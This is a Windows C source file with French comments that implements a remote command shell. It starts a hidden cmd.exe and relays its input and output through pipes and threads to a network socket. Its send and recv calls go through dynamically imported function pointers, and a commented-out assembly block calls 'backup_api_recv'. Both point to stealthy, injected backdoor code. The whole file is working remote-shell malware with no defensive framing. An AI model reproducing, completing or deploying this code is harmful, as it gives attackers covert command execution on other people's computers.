#include <windows.h>

#define BUFFER_SIZE 200	//pour doexec

//#define LOCAL
#ifdef LOCAL
	#define SEND send
	#define RECV recv
	#define WSAGETLASTERROR wsagetlasterror
#else
	#define SEND import_send
	#define RECV import_recv
	#define WSAGETLASTERROR import_wsagetlasterror

	//import de fonctions de ws2_32 qu'on va utiliser
	typedef int          (WINAPI *type_send) (SOCKET,const char FAR * ,int,int);
	extern type_send            import_send;
	typedef int          (WINAPI *type_recv) (SOCKET,char FAR*,int,int);
	extern type_recv            import_recv;
	typedef int          (WINAPI *type_wsagetlasterror) (void);
	extern type_wsagetlasterror import_wsagetlasterror;

#endif


HANDLE pipe_shell_out_socket = NULL;
HANDLE pipe_shell_in_socket = NULL;
int global_socket = 0;




//////////////////////////////////////////////////////////////////////////////////////////
//                  //
// LA PARTIE DOEXEC //
//                  //
//////////////////////
//Thread reliant la sortie du shell au socket
static VOID thread_shell_out( LPVOID Parameter)
{

    char    tampon[BUFFER_SIZE];
    DWORD   taille_lue;

	//Ecoute sur le pipe
    while (PeekNamedPipe(pipe_shell_out_socket, tampon, sizeof(tampon),&taille_lue, NULL, NULL)) 
    {
		//Récupère les infos ou reboucle
		if (taille_lue > 0)
			ReadFile(pipe_shell_out_socket, tampon, sizeof(tampon),&taille_lue, NULL);
		else
			{Sleep(50);continue;}

		if (SEND(global_socket, (const char*)tampon, taille_lue, 0) <= 0) 
			break;
    }

	ExitThread(0);
}


//Thread reliant l'entrée du shell au socket
static VOID thread_shell_in (LPVOID Parameter)
{
    
    BYTE  tampon[BUFFER_SIZE];
    DWORD taille;

	while (1)
	{
		// Lis sur le socket
		taille = RECV(global_socket, (char*) tampon, sizeof(tampon), 0);
		/*__asm
		{
			push 0
			push BUFFER_SIZE
			lea eax,tampon
			push eax
			push tampon
			push global_socket
			call backup_api_recv
			mov taille,eax
		}*/


		if ( (taille == 0) || ((taille == -1) && (WSAGETLASTERROR() == 10035)) )
			{Sleep(50);continue;}
			
		//Et écrit sur le pipe
		if (!WriteFile(pipe_shell_in_socket, tampon, taille, &taille, NULL))
				break;
	}
	ExitThread(0);
}



BOOL doexec( int  ClientSocket )
{
	//Pour creer les pipes
	BOOL verdict;

	HANDLE pipe_shell_out_shell  = NULL;	//shell -> pipe -> socket
	HANDLE pipe_shell_in_shell  = NULL;		//socket -> pipe -> shell

	//Pour créer le processus CMD
	HANDLE handle_commande = NULL;
    PROCESS_INFORMATION ProcessInformation;
    STARTUPINFO si;

	//Pour créer le thread de sortie de shell
    HANDLE handle_thread_shell_out;
	HANDLE handle_thread_shell_in;
	DWORD thread_id;

	//Pour attendre la fin des threads/process pipés
	HANDLE HandleArray[3];
	int i;

	//Rend global le socket pour les handlers de pipes
	global_socket = ClientSocket;
    	
	//Attributs de securite pour les pipes
	SECURITY_ATTRIBUTES securite;
	securite.nLength = sizeof(securite);
	securite.lpSecurityDescriptor = NULL;
	securite.bInheritHandle = TRUE;

    //Créé le pipe stdout
	verdict = CreatePipe(&pipe_shell_out_socket, &pipe_shell_out_shell,&securite, 0);
    if (!verdict) goto Failure;

    verdict = CreatePipe(&pipe_shell_in_shell, &pipe_shell_in_socket,&securite, 0);
    if (!verdict) goto Failure;
	
	//Les attibuts pour les threads de pipe
    securite.nLength = sizeof(securite);
    securite.lpSecurityDescriptor = NULL;
    securite.bInheritHandle = FALSE;

	//Créé les threads de piping
    handle_thread_shell_out = 
        CreateThread(&securite,0,(LPTHREAD_START_ROUTINE)thread_shell_out,0,0,&thread_id);
    if (handle_thread_shell_out == NULL) 
		goto Failure;

	handle_thread_shell_in = 
        CreateThread(&securite,0,(LPTHREAD_START_ROUTINE)thread_shell_in,0,0,&thread_id);
   	if (handle_thread_shell_in == NULL) 
		goto Failure;

    // Règle les startup infos du shell
    si.cb = sizeof(STARTUPINFO);
    si.lpReserved = NULL;
    si.lpTitle = NULL;
    si.lpDesktop = NULL;
    si.dwX = si.dwY = si.dwXSize = si.dwYSize = 0L;
    si.wShowWindow = SW_HIDE;
    si.lpReserved2 = NULL;
    si.cbReserved2 = 0;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = pipe_shell_in_shell;
    si.hStdOutput = pipe_shell_out_shell;
	si.hStdError  = pipe_shell_out_shell;

	//Créé le shell
	if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL,&si, &ProcessInformation)) 
		handle_commande = ProcessInformation.hProcess;
	
	//Ca s'est bien lancé ?
    if (handle_commande == NULL)
		goto Failure;

	//Attente de la fin d'un des threads de pipe ou du processus
	HandleArray[0] = handle_thread_shell_out;
    HandleArray[1] = handle_thread_shell_in;
    HandleArray[2] = handle_commande;
    i = WaitForMultipleObjects(3, HandleArray, FALSE, 0xffffffff);

	switch (i) {
      case WAIT_OBJECT_0 + 0:
        TerminateThread(handle_thread_shell_in, 0);
        TerminateProcess(handle_commande, 1);
        break;
      case WAIT_OBJECT_0 + 1:
        TerminateThread(handle_thread_shell_out, 0);
        TerminateProcess(handle_commande, 1);
        break;
      case WAIT_OBJECT_0 + 2:
        if(!TerminateThread(handle_thread_shell_out, 0))
		{
		#ifdef DEBUG_INFOS
			fprintf(fichier_status,"terminate thread handle_thread_shell_out erreur\n");
			fflush(fichier_status);
		#endif
		}

        if(!TerminateThread(handle_thread_shell_in, 0))
		{
		#ifdef DEBUG_INFOS
			fprintf(fichier_status,"terminate thread handle_thread_shell_in erreur\n");
			fflush(fichier_status);
		#endif
		}

        break;
 
	  default:
        break;
    }

	//Destruction générale
	if (!DisconnectNamedPipe(pipe_shell_out_socket))
	{
		#ifdef DEBUG_INFOS
			fprintf(fichier_status,"desactivation pipe_shell_out_socket erreur(1)\n");
			fflush(fichier_status);
		#endif
	}
	if (!DisconnectNamedPipe(pipe_shell_in_shell))
	{
		#ifdef DEBUG_INFOS
			fprintf(fichier_status,"desactivation pipe_shell_in_shell erreur(2)\n");
			fflush(fichier_status);
		#endif
	}

    if (!CloseHandle(pipe_shell_out_shell))
	{
		#ifdef DEBUG_INFOS
			fprintf(fichier_status,"cloture pipe_shell_out_shell erreur(3)\n");
			fflush(fichier_status);
		#endif
	}

  /*  if (!CloseHandle(pipe_shell_out_socket))
	{
		#ifdef DEBUG_INFOS
			fprintf(fichier_status,"cloture pipe_shell_out_socket erreur(4)\n");//
			fflush(fichier_status);
		#endif
	}

    if (CloseHandle(pipe_shell_in_shell))
	{
		#ifdef DEBUG_INFOS
			fprintf(fichier_status,"cloture pipe_shell_in_shell erreur(5)\n");//
			fflush(fichier_status);
		#endif


	}
*/
    if(!CloseHandle(pipe_shell_in_socket))
	{
		#ifdef DEBUG_INFOS
			fprintf(fichier_status,"cloture pipe_shell_in_socket erreur(6)\n");
			fflush(fichier_status);
		#endif
	}

	return(TRUE);


	//Cas d'echec
Failure:
	#ifdef DEBUG_INFOS
			fprintf(fichier_status,"shell failure\n");
			fflush(fichier_status);
	#endif

	if (pipe_shell_out_shell)  DisconnectNamedPipe(pipe_shell_out_socket);
	if (pipe_shell_in_socket)  DisconnectNamedPipe(pipe_shell_in_shell);
	if (pipe_shell_out_shell)  CloseHandle(pipe_shell_out_shell);
	if (pipe_shell_out_socket) CloseHandle(pipe_shell_out_socket);
	if (pipe_shell_in_shell)   CloseHandle(pipe_shell_in_shell);
	if (pipe_shell_in_socket)  CloseHandle(pipe_shell_in_socket);
	return FALSE;
}


